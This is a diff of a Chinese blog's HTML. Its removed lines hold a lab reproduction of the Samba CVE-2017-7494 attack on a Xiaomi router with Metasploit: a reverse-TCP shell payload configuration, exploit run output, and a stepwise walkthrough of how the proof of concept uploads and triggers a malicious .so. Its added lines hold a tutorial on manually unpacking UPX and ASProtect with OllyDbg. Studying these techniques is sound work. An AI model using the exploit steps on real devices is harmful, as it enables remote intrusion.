-<h2 id="攻击：使用metasploit"><a href="#攻击：使用metasploit" class="headerlink" title="攻击：使用metasploit"></a>攻击：使用metasploit</h2><h3 id="设置攻击参数"><a href="#设置攻击参数" class="headerlink" title="设置攻击参数"></a>设置攻击参数</h3><p>靶机是小米路由器R3，它的系统为mips架构，但是这个库好像对它的支持不是很好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/is_known_pipename):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOSTS          192.168.31.1     yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.216.129  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   7   Linux MIPSLE</span><br></pre></td></tr></table></figure></p>
-<h3 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.216.129:4444</span><br><span class="line">[*] 192.168.31.1:445 - Using location \\192.168.31.1\data\ for the path</span><br><span class="line">[*] 192.168.31.1:445 - Retrieving the remote path of the share &apos;data&apos;</span><br><span class="line">[*] 192.168.31.1:445 - Share &apos;data&apos; has server-side path &apos;/tmp</span><br><span class="line">[*] 192.168.31.1:445 - Uploaded payload to \\192.168.31.1\data\KcQiOcbk.so</span><br><span class="line">[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using \\PIPE\/tmp/KcQiOcbk.so...</span><br><span class="line">[-] 192.168.31.1:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using /tmp/KcQiOcbk.so...</span><br><span class="line">[-] 192.168.31.1:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
-<p>虽然报错，但是查看共享文件夹/tmp却发现了生成了.so文件<br>知乎这篇<a href="https://zhuanlan.zhihu.com/p/27129229" target="_blank" rel="noopener">专栏</a>也有相同问题</p>
-<h2 id="分析POC，查找原因"><a href="#分析POC，查找原因" class="headerlink" title="分析POC，查找原因"></a>分析POC，查找原因</h2><p>(来自<a href="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/" target="_blank" rel="noopener">Wz’blog</a>)</p>
-<h3 id="建立SMB连接。若需要账号密码登录，则必须登录后才能继续"><a href="#建立SMB连接。若需要账号密码登录，则必须登录后才能继续" class="headerlink" title="建立SMB连接。若需要账号密码登录，则必须登录后才能继续"></a>建立SMB连接。若需要账号密码登录，则必须登录后才能继续</h3><p>从微软上扒的SMB协议建立时序图：<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-09-40.png" alt></p>
-<p>对应POC:</p>
-<p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/23-15-57.png" alt></p>
-<h3 id="利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path"><a href="#利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path" class="headerlink" title="利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)"></a>利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-38-48.jpg" alt></p>
-<p>其中find_writeable_path()函数需要跟进看一下：<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-14-43.jpg" alt></p>
-<p>再跟进看enumerate_directories()以及verify_writeable_directory函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-48-27.jpg" alt><br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-18-44.jpg" alt></p>
-<p>可以看到代码逻辑很清楚，首先遍历出当前路径所有的文件夹，然后尝试往里面写一个随机的txt文件用作可写测试，随后删除掉txt文件，记录下可写的文件路径。<br>至此，我们得到了一个共享名(即本例中的data)以及其当前路径下的可写目录(/tmp)</p>
-<h3 id="利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath"><a href="#利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath" class="headerlink" title="利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)"></a>利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-26-47.jpg" alt><br>至此获取到了共享名data的绝对路径。<br>值得注意的是，这里跟早期的Payload不一样，早期的payload是靠暴力猜解目录，所以跟一些分析文章有些出入。现在的Payload是根据NetShareGetInfo直接获取到准确的路径，极大地提高了攻击的成功率。</p>
-<h3 id="上传恶意so文件"><a href="#上传恶意so文件" class="headerlink" title="上传恶意so文件"></a>上传恶意so文件</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-38-28.jpg" alt><br>其中写入的so文件是Metasploit生成的反弹shell，很简单的执行一句命令。有一点需要注意的是里面的函数名必须是samba_init_module并且是一个导出函数，这个原因上述的漏洞分析也有提及。</p>
-<h3 id="调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"><a href="#调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功" class="headerlink" title="调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"></a>调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-43-02.jpg" alt><br>利用从第2步获取到的可写文件目录(Path)以及从第3步得到的共享文件绝对路径(SharePath)构造恶意管道名\PIPE\/SharePath/Path/Evil.so，然后通过SMB_COM_NT_CREATE_ANDX进行调用。<br>在复现时，调用恶意so文件总会失败，产生Error Code为：STATUS_OBJECT_NAME_NOT_FOUND的错误。尚未能明白为什么会出现这种首次失败的情况，也许要详细看看smb协议才能知道了。<br>POC代码将STATUS_OBJECT_PATH_INVALID作为我们payload被加载的标志，随后就是用NBSS协议进行了一次远程代码执行的测试，执行代码为echo随机字符串。</p>
-<h3 id="删除恶意so文件，断开smb连接"><a href="#删除恶意so文件，断开smb连接" class="headerlink" title="删除恶意so文件，断开smb连接"></a>删除恶意so文件，断开smb连接</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-45-01.png" alt></p>
-<p>由msf给出的poc过程可见，对小米路由器的攻击在第五步出现问题，因此出现Failed to load STATUS_OBJECT_NAME_NOT_FOUND</p>
+<h3 id="UPX手动脱壳"><a href="#UPX手动脱壳" class="headerlink" title="UPX手动脱壳"></a>UPX手动脱壳</h3><p>根据 <strong><em>栈平衡原理</em></strong> 寻找OEP<br>在编写加壳软件时，必须保证外壳初始化的现场环境（各寄存器值）与原程序的现场环境相同。因此，加壳程序在初始化时保存各寄存器的值，待外壳执行完毕后恢复寄存器的内容，最后跳转到原程序执行。通常用pushad（push eax/ecx/edx/ebx/esp/ebp/esi/edi）、popad来保存和恢复现场环境。<br>首先用Ollydbg加载已加壳的程序，起始代码如下：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557836854/%E5%8A%A0%E5%A3%B3/7.png" alt><br>此时现场环境（寄存器值）如下：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557837144/%E5%8A%A0%E5%A3%B3/8.png" alt><br>在执行pushad指令后，寄存器的值被压入栈中，如下所示：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557837250/%E5%8A%A0%E5%A3%B3/9.png" alt><br>此时esp指向12FFA4h，对这个地址设置硬件访问断点，然后运行程序，在调用popad恢复现场环境时会访问12FFA4h，造成中断，此时离OEP已经不远了：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557837519/%E5%8A%A0%E5%A3%B3/10.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">005B5155   .- E9 9506F4FF   jmp carckUPX.004F57EF</span><br></pre></td></tr></table></figure></p>
+<p>即为跳转到OEP的指令，设置断点，跟进到004F57EF<br>然后就可以使用Ollydump进行程序脱壳和IAT表修复。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557837859/%E5%8A%A0%E5%A3%B3/11.png" alt></p>
+<p>使用PEiD检查，果然壳已经脱掉！</p>
+<h2 id="ASPack"><a href="#ASPack" class="headerlink" title="ASPack"></a><a href="http://www.aspack.com/" target="_blank" rel="noopener">ASPack</a></h2><p>ASPack是一款Win32可执行文件压缩软件，可压缩Win32可执行文件EXE、DLL、OCX，具有很高的兼容性和稳定性。</p>
+<h1 id="加密壳"><a href="#加密壳" class="headerlink" title="加密壳"></a>加密壳</h1><p>加密壳种类较多，一些壳只保护程序，另一些壳提供额外的功能如注册、使用次数、时间限制。越有名的加密壳，其破解可能性越大。</p>
+<h2 id="ASProtect"><a href="#ASProtect" class="headerlink" title="ASProtect"></a>ASProtect</h2><p>这个壳在pack界当选老大是毫无异议的，当然这里的老大不仅指它的加密强度，而是在于它开创了壳的新时代，SEH,BPM断点的清除都出自这里，更为有名的当属RSA的使用，使得Demo版无法被crack成完整版本,code_dips也源于这里。IAT的处理即使到到现在看来也是很强的。他的特长在于各种加密算法的运用，这也是各种壳要学习的地方。<br>它可以压缩、加密、反跟踪代码、CRC校验和花指令等保护措施。<br>使用Blowfish、Twofish、TEA等加密算法，以RSA1024为注册密钥生成器，通过API钩子与加壳程序通信。<br>ASProtect为软件开发人员提供了SDK，从而实现了加密程序的内外结合。<br>ASProtect 1.x系列，低版本用Stripper工具可自动脱壳。ASProtect的SKE系列主要在protect OEP和SDK上采用了虚拟机技术。</p>
+<h3 id="加密后的特征"><a href="#加密后的特征" class="headerlink" title="加密后的特征"></a>加密后的特征</h3><ol>
+<li>导入函数很少</li>
+<li>程序的节名不再是典型的.text</li>
+<li>使用IDA打开，几乎没有可识别的代码</li>
+<li>使用OllyDbg打开程序，被警告该程序已加密，查找参考文本字符串都是乱码</li>
+<li>使用PEiD检查出是ASProtect加壳</li>
+</ol>
 
       
     </div>
@@ -534,16 +526,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/Samba/" rel="tag"># Samba</a>
-          
-            <a href="/tags/远程执行/" rel="tag"># 远程执行</a>
-          
-            <a href="/tags/CVE/" rel="tag"># CVE</a>
-          
-        </div>
-      
 
       
       
@@ -553,8 +535,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/23/auto-send-WX/" rel="next" title="利用itchat定时转发微信消息">
-                <i class="fa fa-chevron-left"></i> 利用itchat定时转发微信消息
+              <a href="/2019/05/13/PE-file/" rel="next" title="PE文件格式学习">
+                <i class="fa fa-chevron-left"></i> PE文件格式学习
               </a>
             
           </div>
@@ -562,10 +544,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/28/逆向工程实验/" rel="prev" title="逆向工程与软件破解">
-                逆向工程与软件破解 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -728,7 +706,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#小米路由器与Samba漏洞CVE-2017-7494"><span class="nav-number">1.</span> <span class="nav-text">小米路由器与Samba漏洞CVE-2017-7494</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Samba介绍"><span class="nav-number">1.2.</span> <span class="nav-text">Samba介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞成因"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小米路由器"><span class="nav-number">1.4.1.</span> <span class="nav-text">小米路由器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击：使用metasploit"><span class="nav-number">1.5.</span> <span class="nav-text">攻击：使用metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置攻击参数"><span class="nav-number">1.5.1.</span> <span class="nav-text">设置攻击参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行攻击"><span class="nav-number">1.5.2.</span> <span class="nav-text">执行攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析POC，查找原因"><span class="nav-number">1.6.</span> <span class="nav-text">分析POC，查找原因</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#建立SMB连接。若需要账号密码登录，则必须登录后才能继续"><span class="nav-number">1.6.1.</span> <span class="nav-text">建立SMB连接。若需要账号密码登录，则必须登录后才能继续</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path"><span class="nav-number">1.6.2.</span> <span class="nav-text">利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath"><span class="nav-number">1.6.3.</span> <span class="nav-text">利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传恶意so文件"><span class="nav-number">1.6.4.</span> <span class="nav-text">上传恶意so文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"><span class="nav-number">1.6.5.</span> <span class="nav-text">调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除恶意so文件，断开smb连接"><span class="nav-number">1.6.6.</span> <span class="nav-text">删除恶意so文件，断开smb连接</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#壳的加载过程"><span class="nav-number">1.</span> <span class="nav-text">壳的加载过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#通用脱壳方法"><span class="nav-number">2.</span> <span class="nav-text">通用脱壳方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找OEP"><span class="nav-number">2.1.</span> <span class="nav-text">寻找OEP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#搜索JMP或者CALL指令的机器码-即一步直达法-只适用于少数壳-包括UPX-ASPACK壳"><span class="nav-number">2.1.1.</span> <span class="nav-text">搜索JMP或者CALL指令的机器码(即一步直达法,只适用于少数壳,包括UPX,ASPACK壳)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用OllyDbg自带的功能定位OEP-SFX法"><span class="nav-number">2.1.2.</span> <span class="nav-text">使用OllyDbg自带的功能定位OEP(SFX法)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Patch过的OD来定位OEP-即内存映像法"><span class="nav-number">2.1.3.</span> <span class="nav-text">使用Patch过的OD来定位OEP(即内存映像法)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆栈平衡法-即ESP定律法"><span class="nav-number">2.1.4.</span> <span class="nav-text">堆栈平衡法(即ESP定律法)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VB应用程序定位OEP法-Native-或者-P-CODE"><span class="nav-number">2.1.5.</span> <span class="nav-text">VB应用程序定位OEP法(Native 或者 P-CODE)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#最后一次异常法"><span class="nav-number">2.1.6.</span> <span class="nav-text">最后一次异常法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用壳最常用的API函数来定位OEP"><span class="nav-number">2.1.7.</span> <span class="nav-text">用壳最常用的API函数来定位OEP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用应用程序调用的第一个API函数来定位OEP"><span class="nav-number">2.1.8.</span> <span class="nav-text">利用应用程序调用的第一个API函数来定位OEP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#压缩壳"><span class="nav-number">3.</span> <span class="nav-text">压缩壳</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UPX"><span class="nav-number">3.1.</span> <span class="nav-text">UPX</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#识别UPX加壳"><span class="nav-number">3.1.1.</span> <span class="nav-text">识别UPX加壳</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UPX手动脱壳"><span class="nav-number">3.1.2.</span> <span class="nav-text">UPX手动脱壳</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASPack"><span class="nav-number">3.2.</span> <span class="nav-text">ASPack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#加密壳"><span class="nav-number">4.</span> <span class="nav-text">加密壳</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ASProtect"><span class="nav-number">4.1.</span> <span class="nav-text">ASProtect</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#加密后的特征"><span class="nav-number">4.1.1.</span> <span class="nav-text">加密后的特征</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
